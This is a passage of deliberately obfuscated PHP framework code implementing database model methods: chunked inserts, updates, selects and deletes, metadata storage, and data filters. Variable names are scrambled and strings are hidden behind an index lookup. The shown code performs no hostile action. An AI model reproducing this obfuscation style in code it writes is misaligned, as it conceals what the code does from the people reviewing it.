$àåÑœû[84] : $àåÑœû[12]; show_json($ô‘õ“˜ . LNG($àåÑœû[457]) . "\50{$áîë·}\x29", !1); } protected function metaSet($¦§öÊÈ, $ÓªöÆ´ = null, $×ïè§òÚ = null) { $ÜÊŞğü =& $_SERVER[¬ÏÕ§Áú]; if (!$this->tableMeta || !$¦§öÊÈ) { return !1; } $‚ğàï´á = $this->tableMeta[$ÜÊŞğü[458]]; $æèğ¸©Ÿ = $this->tableMeta[$ÜÊŞğü[459]]; $Ñ¿‹şŞ = Model($æèğ¸©Ÿ); $”¼ìıŞÑ = array($‚ğàï´á => $¦§öÊÈ, $ÜÊŞğü[460] => $ÓªöÆ´); if (is_null($ÓªöÆ´)) { return $Ñ¿‹şŞ->where(array($‚ğàï´á => $¦§öÊÈ))->delete(); } if (is_null($×ïè§òÚ) && is_string($ÓªöÆ´)) { return $Ñ¿‹şŞ->where($”¼ìıŞÑ)->delete(); } $¸‘Á¶Œ¸ = is_array($ÓªöÆ´) ? $ÓªöÆ´ : array(); if (is_string($ÓªöÆ´)) { $¸‘Á¶Œ¸[$ÓªöÆ´] = $×ïè§òÚ; } $ƒŠ¦“ğ¯ = array(); foreach ($¸‘Á¶Œ¸ as $ÖìÔã±® => $†ë­ãšÆ) { if (is_null($†ë­ãšÆ) && is_string($ÖìÔã±®)) { $Ñ¿‹şŞ->where(array($‚ğàï´á => $¦§öÊÈ, $ÜÊŞğü[460] => $ÖìÔã±®))->delete(); continue; } $this->checkLength($†ë­ãšÆ, !1, $æèğ¸©Ÿ . $ÜÊŞğü[4] . $ÖìÔã±®); $ƒŠ¦“ğ¯[] = array($‚ğàï´á => $¦§öÊÈ, $ÜÊŞğü[107] => $ÖìÔã±®, $ÜÊŞğü[461] => $†ë­ãšÆ); } $¶ı´²¯¹ = $ÜÊŞğü[462] . $æèğ¸©Ÿ; CacheLock::lock($¶ı´²¯¹); $Ñ¿‹şŞ->where(array($‚ğàï´á => $¦§öÊÈ))->addAll($ƒŠ¦“ğ¯, array(), !0); CacheLock::unlock($¶ı´²¯¹); return !0; } public function metaGet($ƒÇ·æªí, $»–Ÿõ’İ = false) { $óû‰·±ƒ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->tableMeta) { return array(); } $æ½¼ŸÓÎ = $this->tableMeta[$óû‰·±ƒ[458]]; $®ı °¡ş = Model($this->tableMeta[$óû‰·±ƒ[459]]); if ($»–Ÿõ’İ) { $­°éõÇ = array($æ½¼ŸÓÎ => $ƒÇ·æªí, $óû‰·±ƒ[107] => $»–Ÿõ’İ); return $®ı °¡ş->where($­°éõÇ)->getField($óû‰·±ƒ[461]); } $­°éõÇ = array($æ½¼ŸÓÎ => $ƒÇ·æªí); $®ÔÉ£êó = $®ı °¡ş->field($óû‰·±ƒ[463])->where($­°éõÇ)->select(); $®ÔÉ£êó = array_to_keyvalue($®ÔÉ£êó, $óû‰·±ƒ[107], $óû‰·±ƒ[461]); return $®ÔÉ£êó; } private function checkDataAutoHas($™‹•‹ı) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÃºÔ£±¸) { if (in_array($™‹•‹ı, explode($_SERVER[¬ÏÕ§Áú][50], $ÃºÔ£±¸[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ãªæ‚Î, $‹¿ÌÇâ‰) { $œè–ˆ® =& $_SERVER[¬ÏÕ§Áú]; if (!is_array($ãªæ‚Î)) { return; } foreach ($this->dataAuto as $¢ÏĞ©µ) { $ö»ÒÌŸ = $¢ÏĞ©µ[0]; if (!in_array($‹¿ÌÇâ‰, explode($œè–ˆ®[50], $¢ÏĞ©µ[2]))) { continue; } switch (trim($¢ÏĞ©µ[3])) { case $œè–ˆ®[407]: case $œè–ˆ®[408]: $ßÕ¾Ù¸Ÿ = $¢ÏĞ©µ[1]; $ŒŒµ‘—ú = isset($¢ÏĞ©µ[4]) ? (array) $¢ÏĞ©µ[4] : array(); if ($ßÕ¾Ù¸Ÿ == $œè–ˆ®[217] && array_key_exists($ö»ÒÌŸ, $ãªæ‚Î)) { if (!$ãªæ‚Î[$ö»ÒÌŸ]) { unset($ãªæ‚Î[$ö»ÒÌŸ]); } break; } if (isset($ãªæ‚Î[$ö»ÒÌŸ])) { array_unshift($ŒŒµ‘—ú, $ãªæ‚Î[$ö»ÒÌŸ]); } if ($œè–ˆ®[407] == $¢ÏĞ©µ[3]) { $ãªæ‚Î[$ö»ÒÌŸ] = call_user_func_array($ßÕ¾Ù¸Ÿ, $ŒŒµ‘—ú); } else { $ãªæ‚Î[$ö»ÒÌŸ] = call_user_func_array(array(&$this, $ßÕ¾Ù¸Ÿ), $ŒŒµ‘—ú); } break; case $œè–ˆ®[359]: if (isset($ãªæ‚Î[$ö»ÒÌŸ]) && $ãªæ‚Î[$ö»ÒÌŸ]) { $ãªæ‚Î[$ö»ÒÌŸ] = call_user_func_array(array(&$this, $¢ÏĞ©µ[1]), array($ãªæ‚Î[$ö»ÒÌŸ])); } break; case $œè–ˆ®[362]: $ãªæ‚Î[$ö»ÒÌŸ] = $ãªæ‚Î[$¢ÏĞ©µ[1]]; break; case $œè–ˆ®[380]: if (isset($ãªæ‚Î[$ö»ÒÌŸ]) && !is_string($ãªæ‚Î[$ö»ÒÌŸ])) { $ãªæ‚Î[$ö»ÒÌŸ] = json_encode_force($ãªæ‚Î[$ö»ÒÌŸ]); } break; case $œè–ˆ®[409]: if ($ãªæ‚Î[$ö»ÒÌŸ] === $œè–ˆ®[12]) { unset($ãªæ‚Î[$ö»ÒÌŸ]); } break; case $œè–ˆ®[410]: $ãªæ‚Î[$ö»ÒÌŸ] = $¢ÏĞ©µ[1]; default: break; } } if ($‹¿ÌÇâ‰ == $œè–ˆ®[441]) { $³ºüêÂŠ = strtolower($this->db->getDbType()); if (strpos($³ºüêÂŠ, $œè–ˆ®[13]) !== 0) { return; } $©÷…² û = $this->field(!0)->fields; $¼‡µ÷µ¨ = $©÷…² û[$œè–ˆ®[341]]; if (isset($©÷…² û[$œè–ˆ®[340]])) { unset($¼‡µ÷µ¨[$©÷…² û[$œè–ˆ®[340]]]); } foreach ($¼‡µ÷µ¨ as $ »êïâŠ => $‹¿ÌÇâ‰) { if (!isset($ãªæ‚Î[$ »êïâŠ])) { $ãªæ‚Î[$ »êïâŠ] = $œè–ˆ®[12]; } } } } private function dataAfterFilter(&$à¬Á×™ş) { $óË¬ö„š =& $_SERVER[¬ÏÕ§Áú]; foreach ($this->dataAuto as $Ô»‘²Äò) { $”àƒØ¿´ = $Ô»‘²Äò[0]; if (!isset($à¬Á×™ş[$”àƒØ¿´])) { continue; } if (!in_array($óË¬ö„š[443], explode($óË¬ö„š[50], $Ô»‘²Äò[2]))) { continue; } switch (trim($Ô»‘²Äò[3])) { case $óË¬ö„š[407]: case $óË¬ö„š[408]: $ƒìùî’ş = isset($Ô»‘²Äò[4]) ? (array) $Ô»‘²Äò[4] : array(); array_unshift($ƒìùî’ş, $à¬Á×™ş[$”àƒØ¿´]); if (isset($Ô»‘²Äò[4]) && $Ô»‘²Äò[4] == $óË¬ö„š[464]) { $ƒìùî’ş = array($à¬Á×™ş[$”àƒØ¿´]); } if ($óË¬ö„š[407] == $Ô»‘²Äò[3]) { $à¬Á×™ş[$”àƒØ¿´] = call_user_func_array($Ô»‘²Äò[1], $ƒìùî’ş); } else { $à¬Á×™ş[$”àƒØ¿´] = call_user_func_array(array(&$this, $Ô»‘²Äò[1]), $ƒìùî’ş); } break; case $óË¬ö„š[359]: if (isset($à¬Á×™ş[$”àƒØ¿´]) && $à¬Á×™ş[$”àƒØ¿´]) { $à¬Á×™ş[$”àƒØ¿´] = call_user_func_array(array(&$this, $Ô»‘²Äò[1]), array($à¬Á×™ş[$”àƒØ¿´])); } break; case $óË¬ö„š[362]: $à¬Á×™ş[$”àƒØ¿´] = $à¬Á×™ş[$Ô»‘²Äò[1]]; break; case $óË¬ö„š[380]: $Öº£†Í = $à¬Á×™ş[$”àƒØ¿´]; $à¬Á×™ş[$”àƒØ¿´] = json_decode($Öº£†Í, !0); if (is_null($à¬Á×™ş[$”àƒØ¿´])) { $à¬Á×™ş[$”àƒØ¿´] = $Öº£†Í; } break; case $óË¬ö„š[409]: if ($à¬Á×™ş[$”àƒØ¿´] === $óË¬ö„š[12]) { unset($à¬Á×™ş[$”àƒØ¿´]); } break; case $óË¬ö„š[410]: $à¬Á×™ş[$”àƒØ¿´] = $Ô»‘²Äò[1]; break; default: break; } } } public function saveAll($â›ï¤çÙ, $Á°·Êû = false) { $‚’º²‚ =& $_SERVER[¬ÏÕ§Áú]; $ÜÖº«» = $this->db; $ŒÕ–ˆ¨ = $this->tablePrefix . $this->tableName; $´¨¶¬Ü = $this->saveAllChunkMake($â›ï¤çÙ); $Á°·Êû = is_array($Á°·Êû) ? $Á°·Êû : array(); foreach ($´¨¶¬Ü as $ öıŒÉ) { $¢ÉñÆ™• = $‚’º²‚[12]; $˜õùàÅÛ = $‚’º²‚[12]; $šÛ…»Ö¦ = array(); $«şúŠö = array(); foreach ($ öıŒÉ as $·Úâ±¨› => $Ô±³ò¾ï) { $¢ÉñÆ™• = $Ô±³ò¾ï[$‚’º²‚[465]]; $«şúŠö[] = $Ô±³ò¾ï[$‚’º²‚[466]]; $óÍîÈê = $ÜÖº«»->parseValue($Ô±³ò¾ï[$‚’º²‚[466]]); foreach ($Ô±³ò¾ï[$‚’º²‚[467]] as $¸Ô¦øø¨ => $û•‹Æˆ¨) { if (!$šÛ…»Ö¦[$¸Ô¦øø¨]) { $šÛ…»Ö¦[$¸Ô¦øø¨] = array(); } $šÛ…»Ö¦[$¸Ô¦øø¨][] = $‚’º²‚[468] . $óÍîÈê . $‚’º²‚[469] . $ÜÖº«»->parseValue($û•‹Æˆ¨); } } $ŠÆ€½ÇŞ = $¢ÉñÆ™•; $ŠÆ€½ÇŞ = $ÜÖº«»->parseKey($ŠÆ€½ÇŞ); foreach ($šÛ…»Ö¦ as $¸Ô¦øø¨ => $óû×ù±¿) { $˜õùàÅÛ .= $‚’º²‚[65] . $ÜÖº«»->parseKey($¸Ô¦øø¨) . $‚’º²‚[470] . $ŠÆ€½ÇŞ . $‚’º²‚[471]; $˜õùàÅÛ .= implode($‚’º²‚[65], $óû×ù±¿) . $‚’º²‚[472]; } $ëıã·÷õ = $Á°·Êû; $ëıã·÷õ[$¢ÉñÆ™•] = array($‚’º²‚[7], $«şúŠö); $»¿éøÇŒ = "\x55\120\104\101\x54\x45\40\140{$ŒÕ–ˆ¨}\x60\40\123\x45\124\40" . rtrim($˜õùàÅÛ, $‚’º²‚[50]) . $‚’º²‚[65] . $ÜÖº«»->parseWhere($ëıã·÷õ); $this->execute($»¿éøÇŒ); $this->chunkEventCheck(count($ öıŒÉ)); } $this->chunkEventSet(); } public function saveAllEach($ûš¦ìƒ, $Ü®ÍÑĞ = false) { $‰µÏŸ¥â =& $_SERVER[¬ÏÕ§Áú]; $äµ‡ƒÄß = $this->db; $ÁÇ™«Áô = $this->tablePrefix . $this->tableName; $´°¬¾½é = $this->saveAllChunkMake($ûš¦ìƒ); $Ü®ÍÑĞ = is_array($Ü®ÍÑĞ) ? $Ü®ÍÑĞ : array(); foreach ($´°¬¾½é as $µ‰ï¢Ç¼) { foreach ($µ‰ï¢Ç¼ as $ùÄóç„ü => $§ŞÎÖĞš) { $ŠßâÓÜ– = $‰µÏŸ¥â[69]; foreach ($§ŞÎÖĞš[$‰µÏŸ¥â[467]] as $¤äÕ«·´ => $ÒÂÔ®Ç) { $ŠßâÓÜ– .= $äµ‡ƒÄß->parseKey($¤äÕ«·´) . $‰µÏŸ¥â[473] . $äµ‡ƒÄß->parseValue($ÒÂÔ®Ç) . $‰µÏŸ¥â[50]; } $Ââˆşğ± = $Ü®ÍÑĞ; $Ââˆşğ±[$§ŞÎÖĞš[$‰µÏŸ¥â[465]]] = $§ŞÎÖĞš[$‰µÏŸ¥â[466]]; $ÓŠßÇ = "\x55\x50\x44\x41\x54\x45\40\x60{$ÁÇ™«Áô}\x60\x20\123\105\124\40" . rtrim($ŠßâÓÜ–, $‰µÏŸ¥â[50]) . $‰µÏŸ¥â[474] . $äµ‡ƒÄß->parseWhere($Ââˆşğ±) . $‰µÏŸ¥â[475]; $this->execute($ÓŠßÇ); } $this->chunkEventCheck(count($µ‰ï¢Ç¼)); } $this->chunkEventSet(); } private function saveAllChunkMake($ıêâ–Ï) { $ù¾”¹Æ¢ =& $_SERVER[¬ÏÕ§Áú]; $ûŒÌÙ¯ç = self::SQL_WHERE_IN_CHUNK; $ıêâ–Ï = is_array($ıêâ–Ï) ? $ıêâ–Ï : array(); $òäÚß¡ = array(); $³‚ÌĞ Ï = ceil(count($ıêâ–Ï) / $ûŒÌÙ¯ç); for ($İ¼•Â¦Û = 0; $İ¼•Â¦Û < $³‚ÌĞ Ï; $İ¼•Â¦Û++) { $Çè˜¤æ = array(); $ÎŒ•§´® = array_slice($ıêâ–Ï, $İ¼•Â¦Û * $ûŒÌÙ¯ç, $ûŒÌÙ¯ç); foreach ($ÎŒ•§´® as $ø÷¢±ò¹) { if (!is_array($ø÷¢±ò¹) || count($ø÷¢±ò¹) < 4 || count($ø÷¢±ò¹) % 2 != 0) { continue; } $ö±¿ÈÍ  = array(); for ($±ü«Í˜œ = 2; $±ü«Í˜œ < count($ø÷¢±ò¹); $±ü«Í˜œ += 2) { $ö±¿ÈÍ [$ø÷¢±ò¹[$±ü«Í˜œ]] = $ø÷¢±ò¹[$±ü«Í˜œ + 1]; } $Çè˜¤æ[] = array($ù¾”¹Æ¢[465] => $ø÷¢±ò¹[0], $ù¾”¹Æ¢[466] => $ø÷¢±ò¹[1], $ù¾”¹Æ¢[467] => $ö±¿ÈÍ ); } $òäÚß¡[] = $Çè˜¤æ; } return $òäÚß¡; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($—”‡Ï¿Ş = false, $¤õĞÍ¿ã = false) { $this->_chunkEvent = $—”‡Ï¿Ş; $this->_chunkEventParam = $¤õĞÍ¿ã; } private function chunkEventCheck($ô¼ıÌêå) { if (!$this->_chunkEvent) { return; } $’©‰¨Ïš = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $’©‰¨Ïš[$_SERVER[¬ÏÕ§Áú][476]] = $ô¼ıÌêå; Hook::trigger($this->_chunkEvent, $’©‰¨Ïš); } public function addAll($ú‹†±Ğ™, $·ÈƒôÔ = array(), $õó²óàÓ = false) { $‚ãŠà‘â =& $_SERVER[¬ÏÕ§Áú]; ignore_timeout(); $¤Ó¦±¨± = self::SQL_WHERE_IN_CHUNK; if (empty($ú‹†±Ğ™)) { $this->error = think_lang($‚ãŠà‘â[360]); return !1; } $·ÈƒôÔ = $this->_parseOptions($·ÈƒôÔ); foreach ($ú‹†±Ğ™ as $í½ÄÇ–¨ => $è¾ç‰–÷) { $ú‹†±Ğ™[$í½ÄÇ–¨] = $this->_facade($è¾ç‰–÷); $this->_beforeInsert($ú‹†±Ğ™[$í½ÄÇ–¨], $·ÈƒôÔ); } if (method_exists($this->db, $‚ãŠà‘â[361])) { for ($ÂõÄ‰Æš = 0; $ÂõÄ‰Æš < count($ú‹†±Ğ™); $ÂõÄ‰Æš += $¤Ó¦±¨±) { $ó‡ØóÏ™ = array_slice($ú‹†±Ğ™, $ÂõÄ‰Æš, $¤Ó¦±¨±); if (!is_array($ó‡ØóÏ™) || count($ó‡ØóÏ™) == 0) { break; } $øØŒÚú = $this->db->insertAll($ó‡ØóÏ™, $·ÈƒôÔ, $õó²óàÓ); $this->chunkEventCheck(count($ó‡ØóÏ™)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ú‹†±Ğ™ as $í½ÄÇ–¨ => $è¾ç‰–÷) { $øØŒÚú = $this->db->insert($è¾ç‰–÷, $·ÈƒôÔ, $õó²óàÓ); } $this->commit(); } if (!1 !== $øØŒÚú) { $Ùş•¯©ò = $this->getLastInsID(); if ($Ùş•¯©ò) { return $Ùş•¯©ò; } } return $øØŒÚú; } public function save($·ÓÛÍª¾ = '', $ı²Ğ¾ÍŸ = array()) { $„–¢¼¸ =& $_SERVER[¬ÏÕ§Áú]; $¾ˆ÷ÉØŠ = self::SQL_WHERE_IN_CHUNK; $‘³ïœİØ = $this->optionsValue(); $Ø²ŠúÜ = $this->findWhereField($‘³ïœİØ); if (!$Ø²ŠúÜ) { return parent::save($·ÓÛÍª¾, $ı²Ğ¾ÍŸ); } $á¨±Ã³ = 0; $ˆ‚ş„ƒ¸ = $‘³ïœİØ[$„–¢¼¸[364]][$Ø²ŠúÜ][1]; $ˆ‚ş„ƒ¸ = is_array($ˆ‚ş„ƒ¸) ? $ˆ‚ş„ƒ¸ : array(); $ÔĞöìÆ = count($ˆ‚ş„ƒ¸); for ($‘ò¨è­‰ = 0; $‘ò¨è­‰ < $ÔĞöìÆ; $‘ò¨è­‰ += $¾ˆ÷ÉØŠ) { $Àì„‹Ëå = array_slice($ˆ‚ş„ƒ¸, $‘ò¨è­‰, $¾ˆ÷ÉØŠ); if (!is_array($Àì„‹Ëå) || count($Àì„‹Ëå) == 0) { break; } $‘³ïœİØ[$„–¢¼¸[364]][$Ø²ŠúÜ][1] = $Àì„‹Ëå; $this->optionsValue($‘³ïœİØ); $á¨±Ã³ += parent::save($·ÓÛÍª¾, $ı²Ğ¾ÍŸ); $this->chunkEventCheck(count($Àì„‹Ëå)); } $this->chunkEventSet(); return $á¨±Ã³; } public function add($õûÍÖÒ = '', $­üô´»— = array(), $˜şÅÀÏ™ = false) { if ($this->addTaskStatus && is_array($õûÍÖÒ)) { $this->addTaskData[] = $õûÍÖÒ; return; } return parent::add($õûÍÖÒ, $­üô´»—, $˜şÅÀÏ™); } public function parseWhereLike($«¾¬ûô¦, $İÂÏÛÑˆ = '', $í´ßó™ = false, &$æÍ¡ŞŸ = false) { $æû›ÂÀƒ =& $_SERVER[¬ÏÕ§Áú]; $æ©åò† = $GLOBALS[$æû›ÂÀƒ[6]][$æû›ÂÀƒ[477]]; if (!$æ©åò†[$æû›ÂÀƒ[478]]) { return $«¾¬ûô¦; } if (!is_array($«¾¬ûô¦)) { return $«¾¬ûô¦; } $Ä‹ôğ€€ = array(); $ºšÍÜ = 0; foreach ($«¾¬ûô¦ as $çëÜÚóµ => $‚ÖõÈïÔ) { if (is_array($‚ÖõÈïÔ) && count($‚ÖõÈïÔ) == 2 && $‚ÖõÈïÔ[0] == $æû›ÂÀƒ[479] && is_string($‚ÖõÈïÔ[1]) && substr($‚ÖõÈïÔ[1], 0, 1) == $æû›ÂÀƒ[480] && substr($‚ÖõÈïÔ[1], strlen($‚ÖõÈïÔ[1]) - 1, 1) == $æû›ÂÀƒ[480]) { $æÍ¡ŞŸ = !0; $Åš¨Àù = is_string($çëÜÚóµ) ? $çëÜÚóµ : $İÂÏÛÑˆ; $ç¤œÛáù = substr($‚ÖõÈïÔ[1], 1, strlen($‚ÖõÈïÔ[1]) - 2); $ç¤œÛáù = $this->db->escapeString($ç¤œÛáù); if (!strpos($Åš¨Àù, $æû›ÂÀƒ[10])) { $Åš¨Àù = $æû›ÂÀƒ[481] . $Åš¨Àù . $æû›ÂÀƒ[481]; } $¾Ïõ…¦ = $æû›ÂÀƒ[233] . $ç¤œÛáù . $æû›ÂÀƒ[233]; $ç¤œÛáù = str_replace(array($æû›ÂÀƒ[10], $æû›ÂÀƒ[482], $æû›ÂÀƒ[11]), $æû›ÂÀƒ[483], $ç¤œÛáù); if ($æ©åò†[$æû›ÂÀƒ[484]]) { $¾Ïõ…¦ = $æû›ÂÀƒ[485] . $ç¤œÛáù . $æû›ÂÀƒ[486]; if ($æ©åò†[$æû›ÂÀƒ[487]]) { $¾Ïõ…¦ = $æû›ÂÀƒ[486] . $ç¤œÛáù . $æû›ÂÀƒ[485]; } } $Ä‹ôğ€€[$ºšÍÜ] = $æû›ÂÀƒ[488] . $Åš¨Àù . $æû›ÂÀƒ[489] . $¾Ïõ…¦ . $æû›ÂÀƒ[490]; $ºšÍÜ++; continue; } if (is_array($‚ÖõÈïÔ)) { $İÂÏÛÑˆ = is_string($çëÜÚóµ) ? $çëÜÚóµ : $İÂÏÛÑˆ; $‚ÖõÈïÔ = $this->parseWhereLike($‚ÖõÈïÔ, $İÂÏÛÑˆ, !0, $æÍ¡ŞŸ); } if (is_numeric($çëÜÚóµ)) { $Ä‹ôğ€€[$ºšÍÜ] = $‚ÖõÈïÔ; $ºšÍÜ++; } else { $Ä‹ôğ€€[$çëÜÚóµ] = $‚ÖõÈïÔ; } } if ($æÍ¡ŞŸ && !$í´ßó™) { } return $Ä‹ôğ€€; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($±í¯Ó‰€ = array()) { $€¼‚ô— =& $_SERVER[¬ÏÕ§Áú]; $É®¿Ğš = self::SQL_WHERE_IN_CHUNK; $Şôå£¿ = $this->optionsValue(); $êü¤—¼ß = $this->findWhereField($Şôå£¿); if (!$êü¤—¼ß || isset($Şôå£¿[$€¼‚ô—[379]]) || isset($Şôå£¿[$€¼‚ô—[439]])) { return parent::select($±í¯Ó‰€); } $’§Å„¤Î = $Şôå£¿[$€¼‚ô—[364]][$êü¤—¼ß][1]; $’§Å„¤Î = is_array($’§Å„¤Î) ? $’§Å„¤Î : array(); $®åúŸû• = null; for ($ğĞï£ªì = 0; $ğĞï£ªì < count($’§Å„¤Î); $ğĞï£ªì += $É®¿Ğš) { $¡ÉæÃŒ = array_slice($’§Å„¤Î, $ğĞï£ªì, $É®¿Ğš); if (!is_array($¡ÉæÃŒ) || count($¡ÉæÃŒ) == 0) { break; } $Şôå£¿[$€¼‚ô—[364]][$êü¤—¼ß][1] = $¡ÉæÃŒ; $this->optionsValue($Şôå£¿); $ŠáÉßª™ = parent::select($±í¯Ó‰€); if (!$ŠáÉßª™) { continue; } $®åúŸû• = is_array($®åúŸû•) ? $®åúŸû• : array(); $®åúŸû• = array_merge($®åúŸû•, $ŠáÉßª™); } return $®åúŸû•; } public function delete($í€„‰ıï = array()) { $õÃ¥€ü  =& $_SERVER[¬ÏÕ§Áú]; $²•÷ö²ß = self::SQL_WHERE_IN_CHUNK; $ôü™‹Ò¿ = $this->optionsValue(); $­îüä¨° = $this->findWhereField($ôü™‹Ò¿); if (!$­îüä¨°) { return parent::delete($í€„‰ıï); } $ùÈØºº = 0; $‚‹Û˜Ü = $ôü™‹Ò¿[$õÃ¥€ü [364]][$­îüä¨°][1]; $‚‹Û˜Ü = is_array($‚‹Û˜Ü) ? $‚‹Û˜Ü : array(); for ($ŠÁª’½Ù = 0; $ŠÁª’½Ù < count($‚‹Û˜Ü); $ŠÁª’½Ù += $²•÷ö²ß) { $âƒëÏŞ = array_slice($‚‹Û˜Ü, $ŠÁª’½Ù, $²•÷ö²ß); if (!is_array($âƒëÏŞ) || count($âƒëÏŞ) == 0) { break; } $ôü™‹Ò¿[$õÃ¥€ü [364]][$­îüä¨°][1] = $âƒëÏŞ; $this->optionsValue($ôü™‹Ò¿); $ùÈØºº += parent::delete($í€„‰ıï); } return $ùÈØºº; } private function findWhereField($…ªİ÷¨Ô) { $êšÁè =& $_SERVER[¬ÏÕ§Áú]; $íë¤·ï = self::SQL_WHERE_IN_CHUNK; if (!is_array($…ªİ÷¨Ô) || !is_array($…ªİ÷¨Ô[$êšÁè[364]])) { return !1; } foreach ($…ªİ÷¨Ô[$êšÁè[364]] as $ÉıèĞÁÕ => $³·å‘çä) { if (is_array($³·å‘çä) && isset($³·å‘çä[0]) && is_string($³·å‘çä[0]) && strtolower($³·å‘çä[0]) == $êšÁè[7] && is_array($³·å‘çä[1]) && count($³·å‘çä[1]) > $íë¤·ï) { ignore_timeout(); return $ÉıèĞÁÕ; } } return !1; } public function setMasterDB($âŸòÙš¾ = true) { think_config($_SERVER[¬ÏÕ§Áú][491], $âŸòÙš¾); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\145\x6d\x4f\160\164\x69\x6f\156"; public $field = array(); public function listData($Á‡Ÿ¾¦‹ = false, $ß§£˜À = "\x6d\157\x64\x69\146\171\x54\151\155\145", $¦êÊòÀà = false) { $·åÖ¥²— =& $_SERVER[¬ÏÕ§Áú]; $Ü³³Œ˜ï = Model($this->modelType)->get(!1, $this->optionType, !0); $ÙÑ®å­ = array_values($Ü³³Œ˜ï); if ($ÙÑ®å­ && $ÙÑ®å­[0] && !is_array($ÙÑ®å­[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ü³³Œ˜ï = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ü³³Œ˜ï) { return $Á‡Ÿ¾¦‹ ? null : array(); } if (!$Á‡Ÿ¾¦‹ && $Á‡Ÿ¾¦‹ !== $·åÖ¥²—[241]) { $Ü³³Œ˜ï = array_filter(array_values($Ü³³Œ˜ï)); return array_sort_by($Ü³³Œ˜ï, $ß§£˜À, $¦êÊòÀà, $·åÖ¥²—[492]); } return $Ü³³Œ˜ï[$·åÖ¥²—[493] . $Á‡Ÿ¾¦‹]; } public function insert($Ô°“æœÅ) { $ÖĞ„ÊœØ =& $_SERVER[¬ÏÕ§Áú]; $Ô°“æœÅ = array_field_key($Ô°“æœÅ, $this->field); $×Éõåè = Model($this->modelType)->get($ÖĞ„ÊœØ[494], $this->optionType . $ÖĞ„ÊœØ[495]); $×Éõåè = $×Éõåè ? $×Éõåè : 0; $Ô°“æœÅ[$ÖĞ„ÊœØ[492]] = ++$×Éõåè; $Ô°“æœÅ[$ÖĞ„ÊœØ[244]] = time(); $Ô°“æœÅ[$ÖĞ„ÊœØ[98]] = time(); Model($this->modelType)->set($ÖĞ„ÊœØ[494], $×Éõåè, $this->optionType . $ÖĞ„ÊœØ[495]); Model($this->modelType)->set($ÖĞ„ÊœØ[493] . $×Éõåè, $Ô°“æœÅ, $this->optionType); return $×Éõåè; } public function insertArr($ñè‘”ËÇ) { $ÃÙôÌà¡ =& $_SERVER[¬ÏÕ§Áú]; if (!$ñè‘”ËÇ || !is_array($ñè‘”ËÇ)) { return !1; } $ê†êˆğ = Model($this->modelType)->get($ÃÙôÌà¡[494], $this->optionType . $ÃÙôÌà¡[495]); $ê†êˆğ = $ê†êˆğ ? $ê†êˆğ : 0; $½Œ£Öáö = array(); foreach ($ñè‘”ËÇ as $±æÌ±¿) { $åæËøã“ = array_field_key($±æÌ±¿, $this->field); $åæËøã“[$ÃÙôÌà¡[492]] = ++$ê†êˆğ; $åæËøã“[$ÃÙôÌà¡[244]] = time(); $åæËøã“[$ÃÙôÌà¡[98]] = time(); $½Œ£Öáö[$ÃÙôÌà¡[493] . $ê†êˆğ] = $åæËøã“; } Model($this->modelType)->set($ÃÙôÌà¡[494], $ê†êˆğ, $this->optionType . $ÃÙôÌà¡[495]); Model($this->modelType)->set($½Œ£Öáö, !1, $this->optionType); return $ê†êˆğ; } public function update($´½í¢şø, $Ë‰úû¸) { $´ì¾‡– =& $_SERVER[¬ÏÕ§Áú]; $Ë‰úû¸ = array_field_key($Ë‰úû¸, $this->field); $£ÃÓò‡Î = $this->listData($´½í¢şø); if (!$£ÃÓò‡Î || !$´½í¢şø) { return !1; } $Ë‰úû¸ = array_merge($£ÃÓò‡Î, $Ë‰úû¸); $Ë‰úû¸[$´ì¾‡–[98]] = time(); return Model($this->modelType)->set($´ì¾‡–[493] . $´½í¢şø, $Ë‰úû¸, $this->optionType); } public function remove($ÃÉô™â¡) { if (!$ÃÉô™â¡) { return !1; } return Model($this->modelType)->remove($_SERVER[¬ÏÕ§Áú][493] . $ÃÉô™â¡, $this->optionType); } public function removeArr($‘Éš·â) { if (!$‘Éš·â) { return !0; } $‰Õ¨æ„Ì = array(); foreach ($‘Éš·â as $ûĞ»€÷Ÿ) { $‰Õ¨æ„Ì[] = $_SERVER[¬ÏÕ§Áú][493] . $ûĞ»€÷Ÿ; } return Model($this->modelType)->removeArr($‰Õ¨æ„Ì, $this->optionType); } public function clear() { $’¯Î¹´ =& $_SERVER[¬ÏÕ§Áú]; Model($this->modelType)->remove($’¯Î¹´[494], $this->optionType . $’¯Î¹´[495]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($õŸ´×¦Ù, $ÌˆÉÊ’Ş) { if (!$ÌˆÉÊ’Ş) { return !1; } $ÇÕ«ÄŞ = $this->listData(); $ÇÕ«ÄŞ = array_to_keyvalue($ÇÕ«ÄŞ, $õŸ´×¦Ù); return isset($ÇÕ«ÄŞ[$ÌˆÉÊ’Ş]) ? $ÇÕ«ÄŞ[$ÌˆÉÊ’Ş] : !1; } public function findByName($’²”ÁÊª) { return $this->findByKey($_SERVER[¬ÏÕ§Áú][32], $’²”ÁÊª); } protected function resetData($áÇ†¬) { $÷€â”É¡ =& $_SERVER[¬ÏÕ§Áú]; if (!$áÇ†¬) { return; } $áÇ†¬ = is_array($áÇ†¬) ? $áÇ†¬ : array(); $‘Â“·–€ = array(); for ($•‚¹³Ï = 0; $•‚¹³Ï < count($áÇ†¬); $•‚¹³Ï++) { if (!$áÇ†¬[$•‚¹³Ï] || !$áÇ†¬[$•‚¹³Ï][$÷€â”É¡[492]]) { continue; } $‘Â“·–€[$÷€â”É¡[493] . $áÇ†¬[$•‚¹³Ï][$÷€â”É¡[492]]] = $áÇ†¬[$•‚¹³Ï]; } return Model($this->modelType)->set($‘Â“·–€, !1, $this->optionType); } private function getAutoName($™ú£‰ï€) { $²üâ ¼§ = array_to_keyvalue($this->listData(), 